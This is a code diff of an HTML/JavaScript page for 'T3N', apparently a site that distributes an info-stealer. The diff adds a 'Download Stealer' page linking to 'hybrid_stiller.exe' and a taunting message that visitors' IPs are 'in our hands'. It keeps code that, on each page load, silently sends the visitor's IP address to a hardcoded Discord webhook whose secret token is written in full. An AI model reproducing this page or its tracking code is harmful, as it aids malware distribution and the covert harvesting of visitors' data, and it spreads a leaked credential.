@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -18,7 +19,7 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
       margin: 0;
       background-color: var(--background-color);
       color: var(--text-color);
@@ -36,16 +37,8 @@
       z-index: 1000;
     }
 
-    .navbar img {
-      margin-left: 20px;
-      width: 75px;
-      height: auto;
-      transition: transform 0.6s ease;
-    }
-
-    .navbar img:hover {
-      animation: spinGrowShrink 0.6s ease;
-    }
+    .navbar img { margin-left: 20px; width: 75px; transition: transform 0.6s ease; }
+    .navbar img:hover { animation: spinGrowShrink 0.6s ease; }
 
     @keyframes spinGrowShrink {
       0% { transform: rotate(0deg) scale(1); }
@@ -55,42 +48,44 @@
 
     .navbar button {
       background: linear-gradient(135deg, #7a2fc2, #5c1f96);
-      color: white;
-      border: none;
-      border-radius: 6px;
-      padding: 10px 20px;
-      margin: 0 10px;
-      font-size: 14px;
-      cursor: pointer;
-      transition: transform 0.3s ease;
+      color: white; border: none; border-radius: 6px;
+      padding: 10px 20px; margin: 0 10px; font-size: 14px;
+      cursor: pointer; transition: 0.3s;
     }
 
-    .navbar button:hover {
-      transform: scale(1.05);
-    }
+    .navbar button:hover { transform: scale(1.05); }
 
     .dashboard-box {
       background-color: var(--box-background-color);
-      padding: 40px;
-      border-radius: 15px;
+      padding: 40px; border-radius: 15px;
       box-shadow: 0 10px 20px rgba(122, 47, 194, 0.3);
-      text-align: center;
-      width: 1200px;
-      margin-top: 150px;
-      opacity: 0;
-      transform: translateY(20px);
+      text-align: center; width: 80%; max-width: 1000px;
+      margin-top: 150px; opacity: 0; transform: translateY(20px);
       transition: all 0.5s ease;
     }
 
-    .dashboard-box.show {
-      opacity: 1;
-      transform: translateY(0);
-    }
+    .dashboard-box.show { opacity: 1; transform: translateY(0); }
 
-    @media (max-width: 768px) {
-      .navbar { flex-direction: column; }
-      .dashboard-box { width: 90%; margin-top: 250px; }
+    .download-btn {
+      background: linear-gradient(135deg, #7a2fc2, #5c1f96);
+      color: white; border: none; border-radius: 6px;
+      padding: 15px 25px; font-size: 16px; cursor: pointer;
+      width: 200px; margin: 20px auto; display: block;
     }
+    .download-btn:disabled { background: gray; cursor: not-allowed; }
+
+    .dropdown { position: relative; display: inline-block; margin-top: 20px; }
+    .dropdown-content {
+      display: none; position: absolute; background: #0a0a0a;
+      border: 2px solid #7a2fc2; border-radius: 8px; min-width: 200px; z-index: 10;
+    }
+    .dropdown-content a { color: #7a2fc2; padding: 12px; text-decoration: none; display: block; }
+    .dropdown-content a:hover { background: #5c1f96; color: white; }
+    .dropdown:hover .dropdown-content { display: block; }
+
+    .eye-img { width: 150px; margin-top: 20px; }
+
+    @media (max-width: 768px) { .navbar { flex-direction: column; } .dashboard-box { margin-top: 250px; } }
   </style>
 </head>
 <body>
@@ -112,68 +107,104 @@
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1363500266363683007/dDMySRUCPEbmBvXgir9DYsqII64bjmZZQF95MGx_7gq2pQfCmNxdzT8kCIUHjYycsvQ0"; 
     let currentLanguage = localStorage.getItem('language') || 'en';
 
-    function getCurrentDate() { return new Date().toLocaleDateString(); }
-
     async function getUserIP() {
         try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
+            const r = await fetch('https://api.ipify.org?format=json');
+            return (await r.json()).ip;
         } catch { return 'Unknown'; }
-    }
-
-    async function sendToDiscord(ip, date) {
-        const payload = { content: `New User: ${date} | IP: ${ip}` };
-        fetch(DISCORD_WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }).catch(() => {});
-    }
-
-    function changeLanguage(language) {
-        currentLanguage = language;
-        localStorage.setItem('language', language);
-        updateContent();
     }
 
     function updateContent() {
         if (currentLanguage === 'ru') {
             window.showHomePage = async () => {
                 const ip = await getUserIP();
-                document.getElementById("dashboard-content").innerHTML = `<h1>Главная T3N</h1><p>Дата: ${getCurrentDate()}</p><p>Твой IP: ${ip}</p>`;
+                document.getElementById("dashboard-content").innerHTML = `
+                    <h1>Добро Пожаловать На Главную Страницу T3N</h1>
+                    <p>Дата: ${new Date().toLocaleDateString()}</p>
+                    <p>Ваш IP: ${ip}</p>
+                    <p style="color: gray;">И помните: ваш IP уже в наших руках</p>
+                    <img src="ugrajauchi_glaz.png" class="eye-img">
+                `;
+            };
+            window.showDownloadPage = () => {
+                document.getElementById("dashboard-content").innerHTML = `
+                    <h1>Скачать Стиллер</h1>
+                    <button class="download-btn" id="dl-btn" disabled>Скачать</button>
+                    <div class="dropdown">
+                        <button class="download-btn">Выберите версию</button>
+                        <div class="dropdown-content">
+                            <a href="#" onclick="setVer('Hybrid')">Hybrid</a>
+                            <a href="#" style="color:gray">Rage (Locked)</a>
+                        </div>
+                    </div>
+                `;
+            };
+            window.showAuthorsPage = () => {
+                document.getElementById("dashboard-content").innerHTML = `
+                    <h1>Авторы</h1>
+                    <p>cif3rbl4t & varenik721</p>
+                    <p>GitHub Copilot & ChatGPT (рабы кода)</p>
+                `;
             };
         } else {
+            // Английская версия (аналогично)
             window.showHomePage = async () => {
                 const ip = await getUserIP();
-                document.getElementById("dashboard-content").innerHTML = `<h1>T3N Home</h1><p>Date: ${getCurrentDate()}</p><p>IP: ${ip}</p>`;
+                document.getElementById("dashboard-content").innerHTML = `
+                    <h1>Welcome to T3N</h1>
+                    <p>IP: ${ip}</p>
+                    <img src="ugrajauchi_glaz.png" class="eye-img">
+                `;
             };
-        } // <--- ВОТ ЭТУ СКОБКУ ТЫ ПОТЕРЯЛ
+            window.showDownloadPage = () => {
+                document.getElementById("dashboard-content").innerHTML = `<h1>Download</h1><button class="download-btn" disabled id="dl-btn">Download</button>`;
+            };
+            window.showAuthorsPage = () => {
+                document.getElementById("dashboard-content").innerHTML = `<h1>Authors</h1><p>cif3rbl4t & varenik721</p>`;
+            };
+        }
 
-        window.showSettingsPage = () => { document.getElementById("dashboard-content").innerHTML = `<h1>Settings</h1><select onchange="changeLanguage(this.value)"><option value="en" ${currentLanguage==='en'?'selected':''}>EN</option><option value="ru" ${currentLanguage==='ru'?'selected':''}>RU</option></select>`; };
-        window.showDownloadPage = () => { document.getElementById("dashboard-content").innerHTML = `<h1>Download</h1><p>Nothing here yet.</p>`; };
-        window.showAuthorsPage = () => { document.getElementById("dashboard-content").innerHTML = `<h1>Authors</h1><p>cif3rbl4t & varenik721</p>`; };
+        window.showSettingsPage = () => {
+            document.getElementById("dashboard-content").innerHTML = `
+                <h1>Settings</h1>
+                <select onchange="localStorage.setItem('language', this.value); location.reload();">
+                    <option value="en" ${currentLanguage==='en'?'selected':''}>English</option>
+                    <option value="ru" ${currentLanguage==='ru'?'selected':''}>Русский</option>
+                </select>
+            `;
+        };
 
         navigateTo('home');
+    }
+
+    function setVer(v) {
+        const btn = document.getElementById('dl-btn');
+        btn.disabled = false;
+        btn.innerText = `Download ${v}`;
+        btn.onclick = () => window.location.href = 'hybrid_stiller.exe';
     }
 
     function navigateTo(page) {
       const content = document.getElementById("dashboard-content");
       content.classList.remove("show");
-
       setTimeout(() => {
         if (page === "home") showHomePage();
         else if (page === "settings") showSettingsPage();
         else if (page === "download") showDownloadPage();
         else if (page === "authors") showAuthorsPage();
-        
         setTimeout(() => content.classList.add("show"), 50);
       }, 300);
     }
 
     document.addEventListener("DOMContentLoaded", () => {
         updateContent();
-        getUserIP().then(ip => sendToDiscord(ip, getCurrentDate()));
+        getUserIP().then(ip => {
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: `User IP: ${ip}`})
+            });
+        });
     });
   </script>
 </body>
